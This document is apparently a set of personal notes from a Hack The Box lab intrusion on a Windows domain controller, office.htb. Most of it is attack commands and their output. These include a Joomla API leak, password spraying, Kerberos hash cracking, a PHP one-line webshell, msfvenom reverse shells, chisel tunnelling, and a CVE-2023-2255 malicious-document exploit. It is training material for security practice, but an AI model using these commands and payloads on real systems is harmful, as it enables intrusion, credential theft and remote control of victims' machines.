Ports Listing:
53      DNS             Simple DNS Plus
80      HTTP            Apache httpd 2.4.56 Win64 OpenSSL/1.1.1t PHP/8.0.28
88      Kerberos        Microsoft Kerberos
139     Netbios         Microsoft netbios-ssn
389     ldap            Microsoft Active Directory LDAP
443     ssl/http        Apache httpd 2.4.56 OpenSSL/1.1.1t PHP/8.0.28
445     microsoft-ds    ?
464     kpasswd5        ?
593     ncacn_http      Microsoft RPC over HTTP 1.0
636     ssl/ldap        Microsoft AD Ldap
3268    ssl/ldap        Microsoft AD Ldap
3269    ssl/ldap        Microsoft AD Ldap
5985    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Interesting Info:
From nmap port 389, Domain: office.htb
Robots Entries:
    http-robots.txt: 16 disallowed entries 
    | /joomla/administrator/ /administrator/ /api/ /bin/ 
    | /cache/ /cli/ /components/ /includes/ /installation/ 
    |_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
    
Make a username list with username-anarchy
Make a password list with cupp

DNS:
    dig axfr: zone transfer failed
    dig any: no info
    dig any @10.129.191.227 office.htb:
        ;; ANSWER SECTION:
        office.htb.		600	IN	A	10.250.0.30
        office.htb.		600	IN	A	10.129.230.226
        office.htb.		3600	IN	NS	dc.office.htb.
        office.htb.		3600	IN	SOA	dc.office.htb. hostmaster.office.htb. 97 900 600 86400 3600

        
HTTP:
    Joomla site - Run joomla-bruteforce
    Directory Listing:
        administrator
        api
        aux
        cache
        com1,2,3
        images
        layouts
        libraries
        lpt1,2
        media
        modules
        nul
        phpmyadmin
        plugins
        prn
        templates
        tmp
        webalizer
    homepage has a login page
    All blogs are written by "Tony Stark" possible
   
LDAP:
    ldapsearch -LLL -x -H ldap://10.129.191.227 -b'' -s base '(objectClass=*)':
        Operations error (1)
           Additional information: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c

SMB:
       smbmap and client null sessions: access denied, no null sessions

RPC - 593:
    impacket-rpcdump 10.129.191.227 -port 593 > rpcDumpScan
        grep -E 'MS-EFSRPC|MS-RPRN|MS-PAR' rpcDumpScan
            look for regular expression list in the file
Protocols:
    [MS-NRPC]: Netlogon Remote Protocol
    [MS-RAA]: Remote Authorization API Protocol
    [MS-LSAT]: Local Security Authority (Translation Methods) Remote
    [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol

KRB:
    impacket-GetNPUsers -dc-ip 10.129.191.227 office.htb/
        [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
    impacket-
    kerbrute GOT A VALID USERNAME! kerbrute userenum --dc 10.129.191.227 -d office.htb tony.txt
        2024/04/16 21:42:22 >  Using KDC(s):
        2024/04/16 21:42:22 >  	10.129.191.227:88
        
        2024/04/16 21:42:23 >  [+] VALID USERNAME:	 tstark@office.htb
        2024/04/16 21:42:23 >  Done! Tested 14 usernames (1 valid) in 1.153 seconds
    
   I made a username list using what I knew from the blog, author of Tony Stark, using username anarchy `username-anarchy Tony Stark > tony.txt`
   I ran that against the domain using kerbrute userenum and got a valid user back of tstark@office.htb
   
   Next use cupp with this info to try and bruteforce the password

I looked up how to find the Joomla version and found that I could find it by going to <ip>/administrator/manifests/files/joomla.xml and got the following response when I went there

    <extension type="file" method="upgrade">
    <name>files_joomla</name>
    <author>Joomla! Project</author>
    <authorEmail>admin@joomla.org</authorEmail>
    <authorUrl>www.joomla.org</authorUrl>
    <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
    <license>
    GNU General Public License version 2 or later; see LICENSE.txt
    </license>
    <version>4.2.7</version>
    <creationDate>2023-01</creationDate>
    <description>FILES_JOOMLA_XML_DESCRIPTION</description>
    <scriptfile>administrator/components/com_admin/script.php</scriptfile>
    <update>
    <schemas>
    <schemapath type="mysql">
    administrator/components/com_admin/sql/updates/mysql
    </schemapath>
    <schemapath type="postgresql">
    administrator/components/com_admin/sql/updates/postgresql
    </schemapath>
    </schemas>
    </update>
    <fileset>
    <files>
    <folder>administrator</folder>
    <folder>api</folder>
    <folder>cache</folder>
    <folder>cli</folder>
    <folder>components</folder>
    <folder>images</folder>
    <folder>includes</folder>
    <folder>language</folder>
    <folder>layouts</folder>
    <folder>libraries</folder>
    <folder>media</folder>
    <folder>modules</folder>
    <folder>plugins</folder>
    <folder>templates</folder>
    <folder>tmp</folder>
    <file>htaccess.txt</file>
    <file>web.config.txt</file>
    <file>LICENSE.txt</file>
    <file>README.txt</file>
    <file>index.php</file>
    </files>
    </fileset>
    <updateservers>
    <server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
    </updateservers>
    </extension>
    
    
    
    Found a vulnerability in version 4.2.7 of Joomla that allows me to read some config files without being authenticated to the site
    If you navigate to api/index.php/v1/config/application?public=true you are able to read everything that is there and I was able to find a possible password that I listed below
       
    root:H0lOgrams4reTakIng0Ver754!
    This seems to be the password and user for something but I am not sure what
    
    Found a secret on the next page for something
        HW1uCFFJuBcloACa
    
   Using the same vulnerability I found a page at /api/index.php/v1/users?public=true that tells me Tony Starks username and that it is Administrator and the email is Administrator@holography.htb
   
   Look up more on the Joomla API possibilities and maybe see about doing a password change
   
   Found a list of components by going to /administrator/components
   
   Possible Vulnerable Components:
        Joomla! Component com_newsfeeds 1.0 - 'feedid' SQL Injection                       | php/webapps/48202.txt
        Joomla! Component com_redirect 1.5.19 - Local File Inclusion                       | php/webapps/35097.txt
        
   Ran kerbrute against the machine again with a bigger user list to see if there were any other accounts on the machine
        I used the xato top 10 million wordlist in Seclists and got a few more matches
            administrator
            etower
            ewhite
            dwolfe
            dlanor
            dmichael
            hhogan
   
    Running crackmapexec against the machine over the SMB port and got a hit on the following valid creds
            dwolfe:H0lOgrams4reTakIng0Ver754!
            
            crackmapexec smb 10.129.230.226 -u ../users -p 'H0lOgrams4reTakIng0Ver754!'
            SMB         10.129.230.226  445    DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
            SMB         10.129.230.226  445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
            SMB         10.129.230.226  445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
            SMB         10.129.230.226  445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
            SMB         10.129.230.226  445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 

    I was able to enumerate the shares that I have access to with this account
            crackmapexec smb 10.129.230.226 -d office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
            SMB         10.129.230.226  445    DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
            SMB         10.129.230.226  445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
            SMB         10.129.230.226  445    DC               [+] Enumerated shares
            SMB         10.129.230.226  445    DC               Share           Permissions     Remark
            SMB         10.129.230.226  445    DC               -----           -----------     ------
            SMB         10.129.230.226  445    DC               ADMIN$                          Remote Admin
            SMB         10.129.230.226  445    DC               C$                              Default share
            SMB         10.129.230.226  445    DC               IPC$            READ            Remote IPC
            SMB         10.129.230.226  445    DC               NETLOGON        READ            Logon server share 
            SMB         10.129.230.226  445    DC               SOC Analysis    READ            
            SMB         10.129.230.226  445    DC               SYSVOL          READ            Logon server share 

    I was able to connect to the "SOC Analysis" share with the following command
            smbclient -U office.htb/dwolfe \\\\10.129.230.226\\SOC\ Analysis
            Password for [OFFICE.HTB\dwolfe]:
            Try "help" to get a list of possible commands.
            smb: \> 

    I was able to list the files and found a pcap that seems to have been done on their network. 
    I was able to open up the packet capture in wireshark and found that is mostly TCP, TLS, DNS, and a little SMB traffic
    However, there are 2 lines of KRB5 traffic that contain a user trying to authenticate to the domain
        tstark
    
    The following article has a lot of good info on what to do with this traffic and how to get hashes and even passwords from it
        https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
        
    I was also able to pull the hash from this inside this traffic as well
            a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
            
    I know that this is a kerberos hash and that it is using AES-256 encryption. I should be able to crack it with hashcat 
    
    Hashcat Options:
        Hashcat supports multiple versions of the KRB5TGS hash which can easily be identified by the number between the dollar signs in the hash itself.

    13100 - Type 23 - $krb5tgs$23$
    19600 - Type 17 - $krb5tgs$17$
    19700 - Type 18 - $krb5tgs$18$
    18200 - ASREP Type 23 - $krb5asrep$23$
    
    Need to pass in more than just the cipher to hashcat:
    
        The other text that we passed in before the cipher text ($krb5pa$18$tstar$SCRM.LOCAL$) is a list of parameters for hashcat to use, separated by a $ symbol.

        The first two are just part of the hashcat format for this hash type. Krb5pa meaning kerberos 5 pre-auth, and 18 meaning kerberos encryption type 18 (AES-256) as discussed above. The next part is the username (which we can get from examining the rest of the kerberos AS-REQ packet in wireshark) and the last part is the domain name (again is just in plain text in other parts of the kerberos packet).
        
    I cracked the hash!
        hashcat -m 19900 tstarkHash rockyou.txt
            tstark:playboy69
    
    
    I was able to use the creds administrator:playboy69 to login to the joomla admin page
        From here I was able to edit the template for the site and add a php oneliner shell to the index page 
            <?php if (isset($_GET['cmd'])) system($_GET['cmd']); ?>
            powershell+-c+Invoke-WebRequest+http://10.10.14.216:5555/backup.exe+-OutFile backup.exe
            
    Using this I was able to get an RCE on the machine and upload a meterpreter payload and get a shell back in metasploit
            msfvenom -p /windows/x64/meterpreter_reverse_tcp -o backup.exe -f exe LHOST=10.10.14.216 LPORT=4444
            
            Using this I was able to get onto the machine and I am trying to get things to run as tstark with the playboy69 password and run a different meterpreter exe to get a session as that user instead
            msfvenom -p /windows/x64/meterpreter_reverse_tcp -o backupUser.exe -f exe LHOST=10.10.14.216 LPORT=4443
            
            I created creds in powershell as the web_account for tstark 
                $name = 'office\tstark'
                $pass = 'playboy69'
                $secpass = ConvertTo-SecureString $pass -AsPlainText -Force
                $creds = New-Object System.Management.Automation.PSCredential($name,$secpass)
                
    Now I am working on a way to get the payload to run as tstark instead of as web_account
    
    Found a github with an open source version of runas that has the password capability builtin
        https://github.com/antonioCoco/RunasCs
        
    I uploaded the exe to the machine and was able to run this exe to get my meterpreter shell
        RunasCs.exe tstark playboy69 backupUser.exe
        
    Found the user flag at C:\Users\tstark\Desktop\user.txt
        type user.txt
        
    Now to do enumeration to do priv esc
    
    WinPEAS Output:
            PPotts is Logged in Currently
            Check MySQL
            RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
                RegPerms: Registry Editors [FullControl]
                Folder: C:\Program Files\Internet Explorer
                File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
            RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
                RegPerms: Registry Editors [FullControl]
                Folder: C:\Program Files (x86)\Microsoft\Edge\Application\121.0.2277.112\BHO
                File: C:\Program Files (x86)\Microsoft\Edge\Application\121.0.2277.112\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)        
            RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}
                RegPerms: Registry Editors [FullControl]
                Folder: C:\Program Files\Microsoft Office\root\Office16
                File: C:\Program Files\Microsoft Office\root\Office16\OCHelper.dll (Unquoted and Space detected)
            Folder: C:\windows\tasks
                FolderPerms: Authenticated Users [WriteData/CreateFiles]
            Folder: C:\windows\system32\tasks
                FolderPerms: Authenticated Users [WriteData/CreateFiles]
            
    I am running winpeas again because it errored out the first time, this time I am having it output to a file in a separate process through metasploit
        execute -f winPEASx64.exe -a 'log'
            Found Misc-Code asigning passwords Regexes
                C:\xampp\apache\conf\extra\httpd-ssl.conf: password: `xxj31ZMTZzkVA'.
            Found Raw Hashes-sha1 Regexes
                C:\Users\All Users\Microsoft\Windows Defender\Platform\4.18.23050.5-0\ThirdPartyNotices.txt:  6aba23f4a8628d599a9ef7fa4811c4ff6e4070e2
            
            
    I ran the local exploit suggester 'post/multi/recon/local_exploit_suggester' in metasploit through the meterpreter and got 4 hits
        exploit/windows/local/bypassuac_sdclt
        exploit/windows/local/cve_2020_1048_printerdemon
        exploit/windows/local/cve_2020_1337_printerdemon
        exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    
    I was able to find that HHogan is part of the remote management group
        C:\Users\tstark\Documents>net localgroup "Remote Management Users"
        net localgroup "Remote Management Users"
        Alias name     Remote Management Users
        Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

        Members

        -------------------------------------------------------------------------------
        HHogan
        The command completed successfully.
        
        Looking back at the ports over where I landed on the box I saw that there is an "internal" folder that is being hosted somewhere, porbably only locally, that may be important to look at
        
        Looking at the files, it seems to be a website that is used for applying to the "holography" company. There is a php script that is allowing you to apply that has a file upload function. It is filtering by file type, but it looks like it would take something like shell.php.docx because the filtering is wrong
        
        I found where the site is hosted!
            It is hosted internally on port 8083
                Found it in the apache config files
                    Listen 8083
                    <VirtualHost *:8083>
                        DocumentRoot "C:\xampp\htdocs\internal"
                        ServerName localhost:8083
                        
        Now I should be able to set up a port forward in metasploit to get to this page
        
        The port forward option through metasploit was not working at all so I moved over to using chisel because this seems the easiest for windows and is the most suggested on the Internet
        
        ./chisel_1.9.1_linux_amd64 server -p 5555 --reverse
        chisel_1.9.1_windows_amd64.exe client 10.10.14.216:5555 R:8083:127.0.0.1:8083
        
        I was then able to navigate to http://localhost:8083 and got the application website that I had seen in the filesystem
        
        I tried to upload a php file to the site named 'test.php.docx' and was able to upload it, but when I went to the file it only downloaded it and it did not run it
        
        Going back to the code, I can see that the site allows upload of 'doc,docx,and odt' files
            I am going to research what an odt file is
            
        Found a cve for odts that may allow me to upload a bad odt file and then retrieve ntlm hashes from users when it is opened. There are two CVEs actually
            cve-2018-10583
            cve-2023-2255
            
        Found a tool that will create a malicious file for me
            https://github.com/rmdavy/badodf/blob/master/badodt.py
            
        I GOT A HASH!
            PPotts::OFFICE:3420f449abeebe24:7BD55D61F5BC46CD7DBDF28F24AE8971:010100000000000080476160A892DA01DEE1B998F6FEF97E0000000002000800390034005900440001001E00570049004E002D0031005200480031004F0039003700320046004C00500004003400570049004E002D0031005200480031004F0039003700320046004C0050002E0039003400590044002E004C004F00430041004C000300140039003400590044002E004C004F00430041004C000500140039003400590044002E004C004F00430041004C000700080080476160A892DA010600040002000000080030003000000000000000010000000020000045DB8C426B7249D8D4BEB262B9481EB02E1A6D49E13F899E593F6DD3287A7AC60A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310036000000000000000000
            
        I can't crack the hash or use it to pass, so I am going to try the other CVE
        
        CVE-2023-2255 works!
            The vulnerability is taking advantage of an issue in odt files where when a user opens them it allows certain editor components to be exploited so that they will reach out to external links and load them without prompting the user.
            
            I found a POC that creates a vulnerable odt file for you and allows you to add a command to it that will run on the victim machine.
                https://github.com/elweth-sec/CVE-2023-2255
                python3 cve-2023-2255.py --cmd 'C:\Users\Public\backupPepper.exe' --output 'resume.odt'
            
             From here I uploaded a meterpreter shell to the box and then had the odt file point to that exe and then uploaded the odt file and waiting for it to run
            After about a minute I got a session back and was on the box as PPOTTS!
            
            After doing some enumeration of PPOTTS home directory, I found a powershell script inside of her Music folder that is being run every two minutes to grab the applications and run them. 
            I queried who owned the file and found that PPOTTS owned the file and I added a line to see who is running the file and found that PPOTTS is running it as well
                added line: "whoami > C:\Users\Public\Documents\test.txt"
                
        I am thinking that this is running because of a scheduled task that is assigned to it. I am going to look and see who is running the task, if I can edit it, etc.
        
        schtasks /query
            Folder: \
            TaskName                                 Next Run Time          Status         
            ======================================== ====================== ===============
            OneDrive Reporting Task-S-1-5-21-1199398 4/25/2024 2:19:31 AM   Ready          
            Review Job Applications                  4/24/2024 2:18:45 PM   Ready          
            
        schtasks /query /TN "Review Job Applications" /V

        Folder: \
        HostName         TaskName                                 Next Run Time          Status          Logon Mode              Last Run Time           Last Result Author           Task To Run                                        Start In                                 Comment                                                                          Scheduled Task State   Idle Time                                Power Management                                 Run As User                              Delete Task If Not Rescheduled Stop Task If Runs X Hours and X Mins     Schedule                                                                         Schedule Type                Start Time   Start Date End Date   Days                                        Months                                      Repeat: Every            Repeat: Until: Time  Repeat: Until: Duration        Repeat: Stop If Still Running      
        ================ ======================================== ====================== =============== ======================= ====================== ============ ================ ================================================== ======================================== ================================================================================ ====================== ======================================== ================================================ ======================================== ============================== ======================================== ================================================================================ ============================ ============ ========== ========== =========================================== =========================================== ======================== ==================== ============================== ===================================
        DC               Review Job Applications                  4/24/2024 2:20:45 PM   Ready           Interactive only        4/24/2024 2:18:46 PM              0 Administrator    powershell.exe C:/users/ppotts/music/job_offering. N/A                                      Review Job Applications                                                          Enabled                Disabled                                                                                  ppotts                                   Disabled                       Disabled                                 Scheduling data is not available in this format.                                 One Time Only, Minute        9:04:45 AM   4/29/2023  N/A        N/A                                         N/A                                         0 Hour(s), 2 Minute(s)   None                 Disabled                       Disabled                           
                                                                                                                                                                   0                                                                                                                                                                                                                                                                                                                                                                                        Disabled                                 Scheduling data is not available in this format.                                 At system start up           N/A          N/A        N/A        N/A                                         N/A                                         N/A                      N/A                  N/A                            N/A                                

        It seems that it is also running as PPOTTS but that the author is the administrator
        I tried to change the run level and user to run as, but I have to have an admin prompt to run those commands
            
            
    Doing more enumeration, I looked in the Powershell history and found the following lines
    cat (Get-PSReadlineOption).HistorySavePath
        cd c:\programdata
        iwr 10.10.14.41/job.txt -o job.txt
        
    I went and searched for this file but did not see it in that location
    I ran a search of the file system for job.txt and did not get any results
        Get-Childitem -Path C:\ -Include *job.txt* -File -Recurse -ErrorAction SilentlyContinue
        
    I ran a search for just the word "job" thinking that the extension may have been changed, I got a lot of results but only a few interesting ones
        Get-Childitem -Path C:\ -Include *job* -File -Recurse -Force -ErrorAction SilentlyContinue
        
            Directory: C:\Program Files\Wireshark\snmp\mibs


                Mode                 LastWriteTime         Length Name                                                                 
                ----                 -------------         ------ ----                                                                 
                -a----         6/27/2011  12:50 PM          69788 Job-Monitoring-MIB                                                   


    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Windows\Recent


                Mode                 LastWriteTime         Length Name                                                                 
                ----                 -------------         ------ ----                                                                 
                -a----         2/14/2024   5:35 PM            657 job.lnk                                                              
                -a----         2/14/2024   5:36 PM            642 job_offering.lnk                                                     


    Directory: C:\Users\PPotts\Music


                Mode                 LastWriteTime         Length Name                                                                 
                ----                 -------------         ------ ----                                                                 
                -a----         2/14/2024   5:36 PM           1858 job_offering.ps1
                
    Not finding anything else, so I am running winpeas again as PPOTTS and digging deeper into the options it shows
        I found a few regpaths that might be interesting
            
                RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
                RegPerms: ppotts [FullControl]
                Key: OneDrive
                Folder: C:\Program Files\Microsoft OneDrive
                File: C:\Program Files\Microsoft OneDrive\OneDrive.exe /background (Unquoted and Space detected)
               =================================================================================================


                RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
                RegPerms: Registry Editors [FullControl]
                Key: Common Startup
                Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
                =================================================================================================


                RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
                RegPerms: Registry Editors [FullControl]
                Folder: C:\Program Files\Internet Explorer
                File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
               =================================================================================================


                Folder: C:\Users\PPotts\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
                FolderPerms: ppotts [AllAccess]
                File: C:\Users\PPotts\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
                FilePerms: ppotts [AllAccess]

        Interesting exe found in home folder
            File Permissions "C:\Users\PPotts\AppData\Local\Microsoft\Teams\Update.exe": ppotts [AllAccess]
    
    Check the Clipboard of PPOTTS to see if something is there
        Get-Clipboard
            There was nothing returned
            
        
